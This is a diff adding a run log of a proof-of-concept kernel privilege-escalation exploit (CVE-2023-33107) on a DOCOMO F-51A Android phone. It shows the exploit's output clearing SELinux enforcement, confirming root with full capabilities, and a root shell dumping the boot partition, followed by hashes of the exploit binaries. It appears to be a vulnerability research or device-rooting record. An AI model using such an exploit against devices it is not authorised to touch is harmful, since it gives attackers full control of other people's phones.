@@ -1,0 +1,35 @@
+F-51A V71R051A physical-device run, 2026-10-15
+Fingerprint: DOCOMO/F51A/F51A:12/V71R051A/F51A.20230213:user/release-keys
+Kernel: 4.19.136+ #1 SMP PREEMPT Mon Feb 13 18:35:16 JST 2023
+Start state: uid=2000(shell), SELinux Enforcing
+
+--- PoC stderr (excerpt) ---
+physical-window self-test ... value=1 ... value=3
+init_user_ns phys=0xa262a6e8
+selinux_state physical candidate=0xa3055000
+SELinux enforcing cleared through physical PTE window
+ROOT CONFIRMED: uid=0 euid=0 gid=0
+Full inheritable/permitted/effective/ambient capabilities installed
+CapInh: 0000003fffffffff
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000003fffffffff
+NoNewPrivs: 0
+Seccomp: 0
+
+--- Interactive PTY ---
+F51A:/data/local/tmp # id; getenforce
+uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
+Permissive
+F51A:/data/local/tmp # dd if=/dev/block/by-name/boot_a of=backup_img/boot_a.img bs=4194304
+24+0 records in
+24+0 records out
+100663296 bytes (96 M) copied
+F51A:/data/local/tmp # sha256sum backup_img/boot_a.img
+583890b03b71a96888711e704b6bb79ef347d2bbca0c9324b9b617669ba479b5
+
+--- Artifacts of that run (pre-reorganisation, two separate binaries) ---
+646f36484a425407335050724b0e2d7a4ccbdbbca89e259267134b1218d7eaa8  cve-2023-33107-f51a
+afec41d278ae800af5f0e1169dbee34bd0c07758e305b3884f3d50cdf7616548  mempressure
+6a821ed50253cd166ffb2c1c3afb05791c540fa9a77badd156d2e7f097e4a235  cve-2023-33107-f51a.verified (first uid-0 confirmation)
